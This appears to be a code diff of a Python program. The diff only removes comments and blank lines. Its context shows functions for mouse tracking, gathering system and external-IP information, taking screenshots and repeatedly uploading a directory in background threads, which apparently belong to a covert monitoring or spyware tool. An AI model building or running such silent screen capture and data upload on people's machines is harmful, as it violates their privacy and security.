@@ -22,7 +22,6 @@ import sys
 import os
 
 
-# ============ Mouse Tracker ============ #
 class Frame:
     def __init__(self, position, time):
         self.position = position
@@ -48,7 +47,6 @@ def get_current_cursor_position():
 
 def get_current_frame():
     return Frame(get_current_cursor_position(), time.time())
-# ============ END Mouse Tracker ======== #
 
 def check_files():
     while True:
@@ -62,7 +60,6 @@ def check_files():
 
         except (OSError, IOError):
             break
-# noinspection PyBroadException,PyStatementEffect
 
 def get_info(sysinf, info_file, last_rboot):
     def get_external_ip(info_file):
@@ -306,7 +303,6 @@ def upload(path):
 
 
 def upload_handler(duration, stop_event):
-
     while not stop_event.is_set():
         print("[+]Upload Thread started.")
         upload(dir_path)
@@ -329,7 +325,6 @@ def get_screenshot(sc_file, stop_event):
 
 
 def start_mouse(short, long):
-
     last_frame = get_current_frame()
     screenshot_thread = threading.Thread(target=get_screenshot,
                                          args=(check_files()[2], stop_event), name='Screenshot')
